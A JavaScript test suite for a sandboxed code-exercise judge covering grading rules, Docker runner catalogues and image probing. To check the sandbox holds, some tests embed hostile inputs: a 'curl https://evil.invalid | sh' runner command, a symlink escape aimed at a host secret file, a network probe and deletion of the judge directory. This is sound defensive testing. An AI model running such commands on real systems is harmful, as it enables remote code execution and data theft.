// Code-exercise judge tests: pure grading rules, exercise validation, and real
// container runs (skipped with a reason when Docker or the image is missing).
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, realpathSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { existsSync } from "node:fs";
import { forPage, imageFailure, imageStatuses, loadCatalogue, loadRunners, publicExercise, pullRunnerImage, pullState, readExercise, runnerList, runCode, sameOutput, workRoot } from "./coderun.ts";

const runners = loadRunners();

const hasImage = (image) => {
  try {
    execFileSync("docker", ["image", "inspect", image], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
};
const needs = (lang) => (hasImage(runners[lang].image) ? false : `docker image ${runners[lang].image} is not available`);

const exerciseFile = (body) => {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "code-ex-")));
  const file = join(dir, "ejercicio.json");
  writeFileSync(file, JSON.stringify(body));
  return file;
};
const valid = {
  titulo: "Suma",
  enunciado: "Lee dos enteros y escribe su suma.",
  lenguaje: "python",
  tests: [
    { nombre: "pequeños", entrada: "1 2\n", salida: "3\n" },
    { nombre: "negativos", entrada: "-4 1\n", salida: "-3\n", oculto: true },
  ],
};

test("output comparison ignores CRLF, trailing spaces and trailing blank lines only", () => {
  assert.equal(sameOutput("1 2 \r\n3\n\n", "1 2\n3"), true);
  assert.equal(sameOutput("1", "2"), false);
  assert.equal(sameOutput(" 1", "1"), false);
  assert.equal(sameOutput("1\n\n2", "1\n2"), false);
});

test("an exercise names its language and every test carries input and expected output", () => {
  const ok = readExercise(exerciseFile(valid), runners);
  assert.equal(ok.limite_segundos, 2);
  assert.equal(ok.tests.length, 2);
  assert.throws(() => readExercise(exerciseFile({ ...valid, lenguaje: "cobol" }), runners), /unknown lenguaje "cobol"/);
  assert.throws(
    () => readExercise(exerciseFile({ ...valid, tests: [{ nombre: "x", entrada: "" }] }), runners),
    /tests\[0\]\.salida must be a string/,
  );
  assert.throws(() => readExercise(exerciseFile({ ...valid, tests: [] }), runners), /at least one test/);
});

test("the page never receives the input or expected output of a hidden test", () => {
  const shown = publicExercise(readExercise(exerciseFile(valid), runners));
  assert.deepEqual(shown.tests, [
    { nombre: "pequeños", oculto: false, entrada: "1 2\n", salida: "3\n" },
    { nombre: "negativos", oculto: true },
  ]);
  assert.equal(JSON.stringify(shown).includes("-4 1"), false);
  const page = forPage({
    compilacion: { ok: true, salida: "" },
    resultados: [{ nombre: "negativos", oculto: true, estado: "incorrecto", entrada: "-4 1\n", esperado: "-3\n", obtenido: "5\n", errores: "", codigo: 0 }],
    aprobados: 0,
    total: 1,
  });
  assert.deepEqual(page.resultados, [{ nombre: "negativos", oculto: true, estado: "incorrecto", codigo: 0 }]);
});

const python = (code, tests, limit = 2) => runCode({ runner: runners.python, code, tests, limitSeconds: limit });

test("a correct program passes every test and a wrong one shows expected against obtained", { skip: needs("python") }, async () => {
  const ex = readExercise(exerciseFile(valid), runners);
  const right = await python("a, b = map(int, input().split())\nprint(a + b)\n", ex.tests);
  assert.equal(right.compilacion.ok, true);
  assert.deepEqual(right.resultados.map((r) => r.estado), ["correcto", "correcto"]);
  assert.equal(right.aprobados, 2);

  const wrong = await python("a, b = map(int, input().split())\nprint(abs(a + b))\n", ex.tests);
  assert.equal(wrong.aprobados, 1);
  assert.deepEqual(
    { estado: wrong.resultados[1].estado, esperado: wrong.resultados[1].esperado, obtenido: wrong.resultados[1].obtenido },
    { estado: "incorrecto", esperado: "-3\n", obtenido: "3\n" },
  );
});

test("a correct program passes even when its output is longer than the shown part", { skip: needs("python") }, async () => {
  const long = 40_000;
  const result = await python(`print('x' * ${long})\n`, [{ nombre: "larga", entrada: "", salida: `${"x".repeat(long)}\n` }]);
  assert.equal(result.resultados[0].estado, "correcto", "grading must see the whole output, not the clipped copy");
  assert.equal(result.aprobados, 1);
});

test("an endless loop is stopped at the time limit and a crash reports its error", { skip: needs("python") }, async () => {
  const started = Date.now();
  const loop = await python("while True:\n    pass\n", [{ nombre: "t", entrada: "", salida: "" }], 1);
  assert.equal(loop.resultados[0].estado, "tiempo");
  assert.ok(Date.now() - started < 20000, "the run must not hang");

  const crash = await python("raise ValueError('boom')\n", [{ nombre: "t", entrada: "", salida: "" }]);
  assert.equal(crash.resultados[0].estado, "error");
  assert.match(crash.resultados[0].errores, /ValueError: boom/);
  assert.notEqual(crash.resultados[0].codigo, 0);
});

test("the program has no network and cannot make the host read a file through a symlink", { skip: needs("python") }, async () => {
  const net = await python(
    "import socket\ntry:\n    socket.create_connection(('1.1.1.1', 53), timeout=2)\n    print('online')\nexcept OSError:\n    print('offline')\n",
    [{ nombre: "red", entrada: "", salida: "offline\n" }],
  );
  assert.equal(net.resultados[0].estado, "correcto");

  const secretDir = realpathSync(mkdtempSync(join(tmpdir(), "code-secret-")));
  const secret = join(secretDir, "secret.txt");
  writeFileSync(secret, "TOP-SECRET-HOST-DATA\n");
  const escape = await python(
    `import os\nfor name in ('0.err', '0.out'):\n    p = '/work/.judge/out/' + name\n    os.remove(p)\n    os.symlink(${JSON.stringify(secret)}, p)\n`,
    [{ nombre: "fuga", entrada: "", salida: "" }],
  );
  assert.equal(escape.resultados[0].codigo, 0, "the symlink attack itself must have run");
  assert.equal(JSON.stringify(escape).includes("TOP-SECRET"), false);
});

test("a compile error is reported and no test runs", { skip: needs("c") }, async () => {
  const result = await runCode({
    runner: runners.c,
    code: "int main(void) { return x; }\n",
    tests: [{ nombre: "t", entrada: "", salida: "" }],
    limitSeconds: 2,
  });
  assert.equal(result.compilacion.ok, false);
  assert.match(result.compilacion.salida, /'x' undeclared/);
  assert.deepEqual(result.resultados, []);
  assert.equal(result.aprobados, 0);
  assert.equal(result.total, 1);
});

test("a failed docker inspect is classified daemon-down or missing-image", () => {
  assert.equal(imageFailure(1, "Cannot connect to the Docker daemon at unix:///run/containerd.socket"), "daemon");
  assert.equal(imageFailure(1, "failed to connect to the docker API at unix:///sock; check if the path is correct"), "daemon");
  assert.equal(imageFailure(1, "Error: No such image: python:3.12-alpine"), "missing");
  assert.equal(imageFailure(125, "docker: permission denied"), "missing");
});

test("the judge work tree prefers shared-memory tmpfs", () => {
  assert.ok(existsSync(workRoot()));
  if (process.platform !== "win32") assert.equal(workRoot(), "/dev/shm");
});

test("the judge's container stderr reaches the result when the judge cannot run a test", { skip: needs("python") }, async () => {
  const result = await runCode({
    runner: runners.python,
    code: 'import shutil\nshutil.rmtree("/work/.judge", ignore_errors=True)\nprint("x")\n',
    tests: [{ nombre: "visible", entrada: "", salida: "x\n" }],
    limitSeconds: 5,
  });
  assert.equal(result.resultados[0].estado, "error");
  assert.match(result.resultados[0].errores, /el juez no terminó esta prueba/);
  assert.match(result.resultados[0].errores, /create|nonexistent|exit \d+/i);
});

// #348: the catalogue is three layers, and a runner may seed its container.
function catalogueFile(entries) {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "runner-catalogue-")));
  const file = join(dir, "runners.json");
  writeFileSync(file, JSON.stringify(entries));
  return file;
}

const builtinEntry = { image: "builtin-python:test", file: "main.py", run: "python3 main.py" };

/** A docker CLI whose answers the probe can exercise without a daemon. */
function probeStub(script, name = "docker") {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "image-probe-")));
  const file = join(dir, name);
  writeFileSync(file, script, { mode: 0o755 });
  return file;
}

const DAEMON_DOWN = '#!/bin/sh\necho "Cannot connect to the Docker daemon at unix:///var/run/docker.sock" >&2\nexit 1\n';
const probeCatalogue = (image) => loadCatalogue({
  builtinFile: catalogueFile({ python: { image, file: "main.py", run: "python3 main.py", size: "~18 MB" } }),
  env: isolatedEnv(dirname(image)),
});

const isolatedEnv = (dir, extra = {}) => ({ HOME: dir, XDG_CONFIG_HOME: join(dir, "config"), ...extra });

test("the machine overlay extends builtins and honours LEARNING_RUNNERS (#348)", () => {
  const builtinFile = catalogueFile({ python: builtinEntry, sqlite: runners.sqlite });
  const overlay = catalogueFile({
    python: { image: "machine-python:test", file: "main.py", run: "python3 main.py", size: "~20 MB" },
    rust: { image: "rust:test", file: "main.rs", compile: "rustc main.rs", run: "./main" },
  });
  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile), { LEARNING_RUNNERS: overlay }) });
  assert.equal(catalogue.runners.python.image, "machine-python:test", "the machine wins over a builtin");
  assert.equal(catalogue.runners.rust.image, "rust:test", "the machine adds a language");
  assert.equal(catalogue.runners.sqlite.image, runners.sqlite.image, "builtins not overridden survive");
  assert.deepEqual(catalogue.warnings, []);
  assert.match(catalogue.sources.map((s) => s.kind).join(","), /builtin,machine/);
});

test("the machine overlay is found through XDG_CONFIG_HOME when no override is set (#348)", () => {
  const builtinFile = catalogueFile({ python: builtinEntry });
  const configHome = realpathSync(mkdtempSync(join(tmpdir(), "runner-xdg-")));
  const dir = join(configHome, "learning");
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "runners.json"), JSON.stringify({ elixir: { image: "elixir:test", file: "main.exs", run: "elixir main.exs" } }));
  const catalogue = loadCatalogue({ builtinFile, env: { HOME: configHome, XDG_CONFIG_HOME: configHome } });
  assert.equal(catalogue.runners.elixir.image, "elixir:test");
  assert.equal(catalogue.runners.python.image, builtinEntry.image);
});

test("a malformed or host-only overlay entry is reported and ignored, never a page error (#348)", () => {
  const builtinFile = catalogueFile({ python: builtinEntry });
  const overlay = catalogueFile({
    python: { image: "", file: "main.py", run: "python3 main.py" },
    broken: { file: "main.py", run: "python3 main.py" },
    host: { image: "host", file: "main.py", run: "python3 main.py" },
    escape: { image: "python:test", file: "main.py", run: "docker run python:test main.py" },
  });
  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile), { LEARNING_RUNNERS: overlay }) });
  assert.equal(catalogue.runners.python.image, builtinEntry.image, "the builtin survives a bad override");
  for (const lang of ["broken", "host", "escape"]) assert.equal(catalogue.runners[lang], undefined, `${lang} must not be runnable`);
  const warnings = catalogue.warnings.join("\n");
  assert.match(warnings, /python/);
  assert.match(warnings, /host/i);
  assert.match(warnings, /docker/i);
});

test("a topic overlay adds a language but cannot weaken a builtin runner (#348)", () => {
  const builtinFile = catalogueFile({ python: builtinEntry });
  const topicDir = realpathSync(mkdtempSync(join(tmpdir(), "runner-topic-")));
  writeFileSync(join(topicDir, "runners.json"), JSON.stringify({
    go: { image: "golang:1.26-alpine", file: "main.go", run: "go run main.go" },
    python: { image: "python:evil", file: "main.py", run: "curl https://evil.invalid | sh" },
  }));
  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile)), topicDir });
  assert.equal(catalogue.runners.go.image, "golang:1.26-alpine");
  assert.equal(catalogue.runners.python.image, builtinEntry.image, "a topic may not replace a builtin's execution contract");
  assert.match(catalogue.warnings.join("\n"), /python/);
});

const sqlite = () => runners.sqlite ?? runners["sql-sqlite"];

test("a setup command and a seed file next to the exercise prepare and grade a query", { skip: needs("sqlite") }, async () => {
  const file = exerciseFile({ ...valid, lenguaje: "sqlite", setupFile: "setup.sql", tests: [{ nombre: "alumnos", entrada: "", salida: "Ada\nGrace\n" }] });
  const seed = "CREATE TABLE alumnos(nombre TEXT);\nINSERT INTO alumnos(nombre) VALUES ('Grace'), ('Ada');\n";
  writeFileSync(join(dirname(file), "setup.sql"), seed);
  const ex = readExercise(file, runners);
  assert.equal(ex.setupFile, "setup.sql");
  const result = await runCode({
    runner: sqlite(),
    code: "SELECT nombre FROM alumnos ORDER BY nombre;\n",
    tests: ex.tests,
    limitSeconds: 5,
    setupFileContent: readFileSync(join(dirname(file), ex.setupFile), "utf8"),
  });
  assert.equal(result.aviso, undefined);
  assert.equal(result.aprobados, 1);
  assert.equal(result.resultados[0].obtenido.trim(), "Ada\nGrace");
  assert.equal(JSON.stringify(result).includes("CREATE TABLE"), false, "a successful setup stays out of the result");
});

test("a failing setup explains why and grades nothing", { skip: needs("sqlite") }, async () => {
  const file = exerciseFile({ ...valid, lenguaje: "sqlite", setupFile: "setup.sql", tests: [{ nombre: "alumnos", entrada: "", salida: "Ada\n" }] });
  const ex = readExercise(file, runners);
  const result = await runCode({
    runner: { ...sqlite(), setup: "echo 'semilla rota: falta la tabla' >&2; exit 7" },
    code: "SELECT 1;\n",
    tests: ex.tests,
    limitSeconds: 5,
    setupFileContent: "SELECT 1;\n",
  });
  assert.match(result.aviso, /preparación del ejercicio/i);
  assert.match(result.aviso, /semilla rota: falta la tabla/);
  assert.deepEqual(result.resultados, []);
  assert.equal(result.total, 0, "nothing was graded");
  assert.equal(result.aprobados, 0);
});

test("a daemon error makes the probe answer unknown, never present or plain missing (#350)", async () => {
  const image = "probe-daemon:350";
  const dockerBin = probeStub(DAEMON_DOWN);
  const status = (await imageStatuses([image], { dockerBin }))[image];
  assert.equal(status.state, "unknown");
  assert.equal(status.present, false);
  assert.match(status.detail, /Cannot connect/);

  const list = await runnerList(probeCatalogue(image), { dockerBin });
  assert.equal(list.languages[0].state, "unknown");
  assert.equal(list.languages[0].present, false);
  assert.equal(list.languages[0].size, "~18 MB");
  assert.equal(list.languages[0].pull, `docker pull ${image}`);
  assert.deepEqual(list.runnable, [], "an unchecked image is never advertised as runnable");
});

test("a missing docker CLI makes the probe answer unknown (#350)", async () => {
  const image = "probe-enoent:350";
  const dockerBin = join(dirname(probeStub(DAEMON_DOWN)), "no-docker-on-path");
  const status = (await imageStatuses([image], { dockerBin }))[image];
  assert.equal(status.state, "unknown");
  assert.equal(status.present, false);
  assert.match(status.detail, /ENOENT|no-docker-on-path/);
});

test("a probe that times out makes the image unknown, not absent (#350)", async () => {
  const image = "probe-timeout:350";
  const dockerBin = probeStub("#!/bin/sh\nwhile :; do :; done\n");
  const status = (await imageStatuses([image], { dockerBin, timeoutMs: 80 }))[image];
  assert.equal(status.state, "unknown");
  assert.equal(status.present, false);
  assert.match(status.detail, /timed out|timeout|tiempo/i);
});

test("a successful inspect is present and a missing image stays absent (#350)", async () => {
  const presentImage = "probe-present:350";
  const present = (await imageStatuses([presentImage], { dockerBin: probeStub("#!/bin/sh\nprintf '12345678\n'\nexit 0\n") }))[presentImage];
  assert.equal(present.state, "present");
  assert.equal(present.present, true);
  assert.equal(present.bytes, 12345678);
  assert.deepEqual((await runnerList(probeCatalogue(presentImage), { dockerBin: probeStub("#!/bin/sh\nprintf '12345678\n'\nexit 0\n") })).runnable, ["python"]);

  const missingImage = "probe-missing:350";
  const missing = (await imageStatuses([missingImage], { dockerBin: probeStub('#!/bin/sh\necho "Error: No such image: probe-missing:350" >&2\nexit 1\n') }))[missingImage];
  assert.equal(missing.state, "missing");
  assert.equal(missing.present, false);
  assert.deepEqual((await runnerList(probeCatalogue(missingImage), { dockerBin: probeStub('#!/bin/sh\necho "Error: No such image" >&2\nexit 1\n') })).runnable, []);
});

test("an unknown answer is cached and flips when a later probe answers (#350)", async () => {
  const image = "probe-flip:350";
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "probe-flip-")));
  const dockerBin = join(dir, "docker");
  const log = join(dir, "calls.log");
  const ready = join(dir, "ready");
  writeFileSync(dockerBin, [
    "#!/bin/sh",
    `printf '%s\\n' "$*" >> ${JSON.stringify(log)}`,
    `if [ -f ${JSON.stringify(ready)} ]; then printf '99\\n'; exit 0; fi`,
    'echo "Cannot connect to the Docker daemon" >&2; exit 1',
    "",
  ].join("\n"), { mode: 0o755 });
  const options = { dockerBin, ttlMs: 60, timeoutMs: 500 };
  const [first, concurrent] = await Promise.all([imageStatuses([image], options), imageStatuses([image], options)]);
  assert.equal(first[image].state, "unknown");
  assert.equal(concurrent[image].state, "unknown");
  const calls = () => readFileSync(log, "utf8").trim().split(/\n/).filter(Boolean).length;
  assert.equal(calls(), 1, "concurrent pages share one inspect");
  assert.equal((await imageStatuses([image], options))[image].state, "unknown");
  assert.equal(calls(), 1, "a cached unknown stays unknown until the TTL ends");
  writeFileSync(ready, "");
  await new Promise((resolve) => setTimeout(resolve, 90));
  const fresh = (await imageStatuses([image], options))[image];
  assert.equal(fresh.state, "present");
  assert.equal(fresh.bytes, 99);
});

test("a pull asked while the probe cannot answer reports the state, not an error dump (#350)", async () => {
  const image = "probe-pull:350";
  const dockerBin = probeStub(DAEMON_DOWN);
  const state = await pullRunnerImage("probe", { image, file: "main.py", run: "python3 main.py" }, dockerBin);
  assert.equal(state.state, "unknown");
  assert.match(state.message, /no se pudo comprobar/i);
  assert.doesNotMatch(state.message, /ENOENT|spawn|exit \d/);
  assert.equal(pullState("probe").state, "unknown");
});

test("runner listings give a friendly label, a short pull and the pinned reference", async () => {
  const image = "python:3.12-alpine@sha256:b658b05ce9c4eb97ec6fc19424818a1f31993659c2b505a532f470e83807815d";
  const builtinFile = catalogueFile({ python: { image, file: "main.py", run: "python3 main.py", size: "~18 MB", label: "Python 3.12" } });
  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile)) });
  const list = await runnerList(catalogue);
  const python = list.languages.find((item) => item.language === "python");
  assert.equal(python.label, "Python 3.12");
  assert.equal(python.size, "~18 MB");
  assert.equal(python.pull, "docker pull python:3.12-alpine");
  assert.equal(python.reference, image);
});
